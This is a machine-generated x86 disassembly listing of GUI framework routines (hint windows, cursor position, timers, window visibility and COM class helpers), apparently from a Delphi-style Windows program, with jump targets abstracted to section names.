lea edx [ ebp - 0x4 ]
mov eax esi
call sub_460b68
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fea7
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_45feb8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4032e8
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43fe50
jmp r-xdata
sub_45ff08
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45d4b4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45d4a0
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45ff6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43e55c
mov edi eax
call sub_43ce58
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_440e64
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_440e64
sub_45ffe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4600f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45ff6c
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45e01c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43ce14
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4601a4
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403788#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46053c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ff08
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41cef8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4600fb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_460104
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45d498
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45d484
movzx edx di
xor ecx ecx
call sub_440e64
inc esi
dec ebx
jne r-xdata
sub_460140
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45f25c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45f25c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_460104
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_4601a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404444
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_40408c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439a70
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c728
xor eax eax
push ebp
push sub_460229
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_460238
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_460294
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45d498
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_460238
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45d484
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_460238
pop ecx
jmp r-xdata
mov eax ebx
call sub_4467d4
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call IsChild
test eax eax
jne r-xdata
sub_46031c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405928
call sub_428b74
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_460344
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_460388
push sub_45e074
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46053c
sub_4603b0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cec
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43f7c8
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43e55c
call sub_45e054
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46053c
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cec
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43f7c8
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46053c
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_460344
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_440e64
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_4607d4
jmp r-xdata
sub_4604c0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_460388
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_4607d4
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4604f8
jmp r-xdata
sub_4604f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4464d0
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4464d0
push eax
call ShowWindow
sub_46053c
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4604f8
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45e1dc
mov eax ebx
call sub_460388
sub_460574
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_4606b6
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_42270c
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407e34
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_460687
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4227c4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46068e
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_460564
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_460564
mov [ ebp - 0x4 ] eax
sub_46068e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_4606c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4032e8
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403230
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_460728
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_4607c2
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607c9
lea eax [ ebp - 0x8 ]
call sub_404038
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404128
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4212cc
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c404
mov ebx eax
inc ebx
sub_4607d4
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049a4
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_460b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46053c
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460344
jmp r-xdata
call sub_456a04
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b61
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a74
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43e55c
call sub_45e054
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_460574
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45d418
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f650
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f7f4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45e01c
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43cdd0
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4040d0
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_440e64
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_4606c8
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4034e4
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f7c8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f7c8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43fe50
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45e168
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_460728
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_460344
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460344
jmp r-xdata
sub_460b68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_40408c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_460bc8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_460bf4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_440e64
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_440e64
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44c5f0
sub_460c84
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_460cac
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_460d50
add [ eax ] eax
add [ eax ] al
les ecx [ 0xffffffffc5840047 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_460db3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460dba
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4567b0
mov eax sub_456a30
call sub_4170a4
mov eax [ rw-data ]
push eax
call CloseHandle
sub_460fcc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_40408c
mov eax [ ebx ]
call sub_408674
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_4042f8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_4044f8
mov edx esi
sub edx eax
mov eax ebx
call sub_404684
mov eax [ ebx ]
call sub_408674
mov esi eax
sub al 0xd
je r-xdata
sub_46101c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4610c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_4040d0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40b964
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4610ca
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40afc4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_408f2c
sub_4610ca
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4610ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46115e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_460fcc
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_46101c
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_40408c
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461165
lea eax [ ebp - 0x4 ]
call sub_404038
retn
add esp 0xfffffff0
call sub_40360c
sub_461165
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4611b8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_4611a0
mov eax esi
mov edx [ esp ]
call sub_404260
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_4611e4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_4611a0
mov eax esi
mov edx [ esp ]
call sub_404260
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_461210
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_405928
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_4611a0
pop esi
pop ebx
retn
sub_461248
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
